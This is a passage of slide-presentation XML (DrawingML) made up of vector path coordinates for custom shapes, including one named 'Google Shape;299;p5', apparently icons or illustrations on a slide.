                  <a:lnTo>
                    <a:pt x="8108" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="13499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="13682"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="13682"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3853" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3046" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3046" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4660" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5467" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="2935"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5393" y="14343"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5430" y="14379"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="14379"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="14343"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7704" y="13903"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7961" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="14379"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="13903"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6420" y="14013"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6567" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="14013"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6824" y="2385"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6750" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="14636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="14820"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="14930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="14783"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12033" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="238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299" name="Google Shape;299;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6902250" y="3951050"/>
              <a:ext cx="436525" cy="299875"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="17461" h="11995" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="9758" y="2238"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9721" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="2238"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9795" y="3191"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9721" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="3191"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11519" y="3045"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11409" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="3045"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="15554" y="1541"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="15407" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13683" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="1541"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8914" y="3228"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8841" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="3228"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16324" y="1101"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="16140" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="1137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="1101"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10528" y="3962"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10455" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="4108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="4329"/>
